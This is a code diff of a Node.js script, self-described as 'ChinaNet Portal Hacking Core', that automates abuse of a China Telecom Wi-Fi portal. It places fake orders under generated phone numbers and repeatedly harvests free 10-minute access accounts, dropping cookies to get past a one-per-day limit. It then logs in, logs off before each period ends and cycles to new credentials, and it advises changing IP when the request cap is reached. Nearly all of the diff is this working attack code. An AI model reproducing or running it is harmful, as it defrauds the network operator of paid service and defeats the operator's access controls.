@@ -1,5 +1,13 @@
+/**
+ * ChinaNet Portal Hacking Core
+ *
+ * @date     2014-09-16 22:46:42
+ * @author   Dolphin<dolphin.w.e@gmail.com>
+ */
+
 var http = require('http');
 var https = require('https');
+var parseUrl = require('url').parse;
 var querystring = require('querystring');
 var colors = require('./node_modules/colors');
 var cheerio = require('./node_modules/cheerio');
@@ -24,7 +32,7 @@ var httpReq = (function (querystring, http) {
             path: opt.path || '/',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Content-Length': querystring.stringify(opt.contents).length
+                'Content-Length': opt.contents.length
             }
         };
         if (opt.cookie) {
@@ -36,6 +44,8 @@ var httpReq = (function (querystring, http) {
     var post = function (opt, cb) {
         // 发起 POST 请求
         // callback: object response, string data
+        opt.contents = querystring.stringify(opt.contents);
+
         var req = http.request(createOpt(opt), function (res) {
             res.setEncoding('utf8');
             var data = '';
@@ -47,14 +57,10 @@ var httpReq = (function (querystring, http) {
         });
 
         req.on('error', function (e) {
-            if (e.code === 'ETIMEDOUT') {
-                colorConsole('请求超时\n', 'red');
-                return checkNet();
-            }
             colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
 
-        req.write(querystring.stringify(opt.contents)); // 写入请求内容
+        req.write(opt.contents); // 写入请求内容
         req.end();
     };
 
@@ -72,10 +78,6 @@ var httpReq = (function (querystring, http) {
         });
 
         req.on('error', function (e) {
-            if (e.code === 'ETIMEDOUT') {
-                colorConsole('请求超时\n', 'red');
-                return checkNet();
-            }
             colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
     };
@@ -108,113 +110,131 @@ var linkStart = function (curStatus) {
         var cookie = res['headers']['set-cookie'][0].split(';')[0];
         init.cookie = cookie;
         colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
-        addGood(); // 触发 addGood 请求
+        getLoginInfo();
     });
 };
 
-var addGood = function () {
-    // 向购物车添加物品
-    colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
+var getLoginInfo = (function (init, httpReq) {
+    var loginDelay = undefined; // 延迟登录
 
-    var options = {
-        path: '/service/cart.do',
-        cookie: init.cookie,
-        contents: {
-            method: 'addGood',
-            confirm: 'yes',
-            cardId: 1,
-            type: 1,
-            count: 1
-        }
+    var addGood = function ( /*optional*/ cb) {
+        // 向购物车添加物品
+        // callback: string username, string password
+        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
+        loginDelay = cb;
+
+        var options = {
+            path: '/service/cart.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'addGood',
+                confirm: 'yes',
+                cardId: 1,
+                type: 1,
+                count: 1
+            }
+        };
+
+        httpReq.post(options, list);
     };
 
-    httpReq.post(options, list);
-};
+    var list = function () {
+        // 打开购物车，使请求有效化
+        colorConsole('打开购物车，使请求有效化...\n', 'yellow');
 
-var list = function () {
-    // 打开购物车，使请求有效化
-    colorConsole('打开购物车，使请求有效化...\n', 'yellow');
+        var options = {
+            path: '/service/cart.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'list'
+            }
+        };
 
-    var options = {
-        path: '/service/cart.do',
-        cookie: init.cookie,
-        contents: {
-            method: 'list'
-        }
+        httpReq.post(options, getOrder);
     };
 
-    httpReq.post(options, getOrder);
-};
+    var getOrder = function () {
+        // 获取订单号
+        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');
 
-var getOrder = function () {
-    // 获取订单号
-    colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');
+        var options = {
+            path: '/service/user.do',
+            cookie: init.cookie,
+            contents: {
+                method: 'buy',
+                confirm: 'yes',
+                shopCartFlag: 'shopCart',
+                cardType: 1,
+                cardPayType: 'yi',
+                user_phone: '',
+                smsVerifyCode: '',
+                isBenJi: 'no',
+                phone: init.phone,
+                phone_1: init.phone
+            }
+        };
 
-    var options = {
-        path: '/service/user.do',
-        cookie: init.cookie,
-        contents: {
-            method: 'buy',
-            confirm: 'yes',
-            shopCartFlag: 'shopCart',
-            cardType: 1,
-            cardPayType: 'yi',
-            user_phone: '',
-            smsVerifyCode: '',
-            isBenJi: 'no',
-            phone: init.phone,
-            phone_1: init.phone
-        }
+        httpReq.post(options, function (res, data) {
+            if (data[0] === '1') {
+                // 得到订单号，开始尝试登录
+                init.phone++; // 为下次计算做准备
+                var orderId = data.split(',')[1];
+                colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
+                return getPwd(orderId);
+            }
+            if (data.indexOf('购物车为空') !== -1) {
+                // 若没进行购物车添加，则重新发起请求
+                colorConsole('购物车为空，将再次向购物车添加商品！\n', 'magenta');
+                return addGood();
+            }
+            // 否则生成新的手机号重试
+            colorConsole(data + ' || 没有得到订单号，将更新手机号后再次尝试！\n', 'grey');
+            init.phone = getRandomPhoneNum(); // 生成新的手机号
+            return getOrder();
+        });
     };
 
-    httpReq.post(options, function (res, data) {
-        if (data[0] === '1') {
-            // 得到订单号，开始尝试登录
-            init.phone++; // 为下次计算做准备
-            var orderId = data.split(',')[1];
-            colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
-            return getPwd(orderId);
-        }
-        if (data.indexOf('购物车为空') !== -1) {
-            // 若没进行购物车添加，则重新发起请求
-            colorConsole('购物车为空，将再次向购物车添加商品！\n', 'magenta');
-            return addGood();
-        }
-        // 否则生成新的手机号重试
-        colorConsole(data + ' || 没有得到订单号，将更新手机号后再次尝试！\n', 'grey');
-        init.phone = getRandomPhoneNum(); // 生成新的手机号
-        return getOrder();
-    });
-};
+    var getPwd = function (orderId) {
+        // 获取帐密
+        colorConsole('开始获取账号密码...\n', 'yellow');
 
-var getPwd = function (orderId) {
-    // 获取帐密
-    colorConsole('开始获取账号密码...\n', 'yellow');
+        var options = {
+            // 不带 cookie 以便多次获得账号密码
+            // 否则第二次请求密码会返回'-1,很抱歉,您今天只能获取1次10分钟的时长卡!'
+            path: '/clientApi.do',
+            contents: {
+                method: 'get10mCard',
+                orderId: orderId
+            }
+        };
 
-    var options = {
-        // 不带 cookie 以便多次获得账号密码
-        // 否则第二次请求密码会返回'-1,很抱歉,您今天只能获取1次10分钟的时长卡!'
-        path: '/clientApi.do',
-        contents: {
-            method: 'get10mCard',
-            orderId: orderId
-        }
+        httpReq.post(options, function (res, data) {
+            colorConsole('收到的数据：' + data + '\n', 'cyan');
+            if (data.indexOf('次数过多') !== -1) {
+                return colorConsole('已达到当日请求数上限（50次），请手动刷新 IP\n', 'red');
+            }
+            var t = data.split(','); // 获取有效信息
+            if (t[4] && t[5]) {
+                if (loginDelay && typeof loginDelay === 'function') {
+                    // 有回调时进行回调
+                    // 否则开始登录
+                    setTimeout(function () {
+                        // 延迟一秒回调以便服务器处理账号密码
+                        loginDelay(t[4], t[5]);
+                        loginDelay = undefined;
+                    }, 1000);
+                } else {
+                    login(t[4], t[5]);
+                }
+            } else {
+                colorConsole('未获取到，开始下一组尝试...\n', 'grey');
+                getOrder();
+            }
+        });
     };
 
-    httpReq.post(options, function (res, data) {
-        colorConsole('收到的数据：' + data + '\n', 'cyan');
-        if (data.indexOf('次数过多') !== -1) {
-            return colorConsole('已达到当日请求数上限（50次），请手动刷新 IP\n', 'red');
-        }
-        var t = data.split(','); // 获取有效信息
-        if (t[4] && t[5]) {
-            login(t[4], t[5]);
-        } else {
-            colorConsole('未获取到，开始下一组尝试...\n', 'grey');
-            getOrder();
-        }
-    });
-};
+    return addGood;
+})(init, httpReq);
 
 var login = function (uname, pwd) {
     // 登录
@@ -250,10 +270,6 @@ var login = function (uname, pwd) {
         });
 
         req.on('error', function (e) {
-            if (e.code === 'ETIMEDOUT') {
-                colorConsole('请求超时\n', 'red');
-                return checkNet();
-            }
             colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
         });
 
@@ -261,54 +277,74 @@ var login = function (uname, pwd) {
         req.end();
     };
 
-    var checkLogin = (function () {
-        var isSecondTry = false; // 两次尝试计数
+    var isSecondTry = false; // 两次尝试计数
+    var checkLogin = function (xml) {
+        var $ = cheerio.load(xml, {
+            xmlMode: true
+        });
 
-        var check = function (xml) {
-            var $ = cheerio.load(xml, {
-                xmlMode: true
-            });
+        var loginStatus = $('ResponseCode').text();
 
-            var loginStatus = $('ResponseCode').text();
+        if (loginStatus && parseInt(loginStatus) === 50) {
+            colorConsole('登录成功！九分半后开始切换账号\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
 
-            if (loginStatus && parseInt(loginStatus) === 50) {
-                colorConsole('登录成功！八分钟后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
-
-                setTimeout(function () {
-                    // 八分钟触发定时器
-                    colorConsole('开始检查网络连接...\n', 'magenta');
-                    checkNet();
-                }, 480000);
+            setTimeout(function () {
+                // 九分半触发定时器
+                logoff($('LogoffURL').text().trim());
+            }, 570000);
+        } else {
+            if (isSecondTry) {
+                // 两次登录都失败就放弃吧
+                colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
+                getLoginInfo();
             } else {
-                if (isSecondTry) {
-                    // 两次登录都失败就放弃吧
-                    colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
-                    addGood(); // 直接从添加商品开始
-                } else {
-                    // 电信渣服务器可能不能即时处理分配到的账号密码
-                    colorConsole('登录失败，一秒后再次尝试登录...\n', 'magenta');
-                    setTimeout(function () {
-                        isSecondTry = true; // 标记第二次尝试
-                        hackLogin();
-                    }, 1000);
-                }
+                // 电信渣服务器可能不能即时处理分配到的账号密码
+                colorConsole('登录失败，一秒后再次尝试登录...\n', 'magenta');
+                setTimeout(function () {
+                    isSecondTry = true; // 标记第二次尝试
+                    hackLogin();
+                }, 1000);
             }
-        };
-        return check;
-    })();
+        }
+    };
 
     hackLogin();
 };
 
-var checkNet = function () {
-    // 检测网络是否连接上
-    httpReq.get('http://www.baidu.com', function (res) {
-        if (res.statusCode !== 200) {
-            colorConsole('网络断开，开始下一组尝试...\n', 'grey');
-            addGood();
-        } else {
-            setTimeout(checkNet, 10000); // 每十秒检测一次
-        }
+var logoff = function (url) {
+    // 注销再次登录
+    url = parseUrl(url);
+
+    getLoginInfo(function (uname, pwd) {
+        colorConsole('开始注销登录\n', 'magenta');
+
+        https.get({
+            host: url.host,
+            path: url.path,
+            headers: {
+                'User-Agent': 'CDMA+WLAN'
+            }
+        }, function (res) {
+            res.setEncoding('utf8');
+            var xml = '';
+            res.on('data', function (chunk) {
+                // 得到的是一个 xml 文件
+                xml += chunk;
+            }).on('end', function () {
+                var $ = cheerio.load(xml, {
+                    xmlMode: true
+                });
+                var logoffStatus = $('ResponseCode').text();
+                if (logoffStatus && parseInt(logoffStatus) === 150) {
+                    colorConsole('> 注销成功\n', 'green');
+                    login(uname, pwd);
+                } else {
+                    colorConsole('> 注销失败\n', 'red');
+                }
+            });
+        }).on('error', function (e) {
+            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
+        });
     });
 };
 
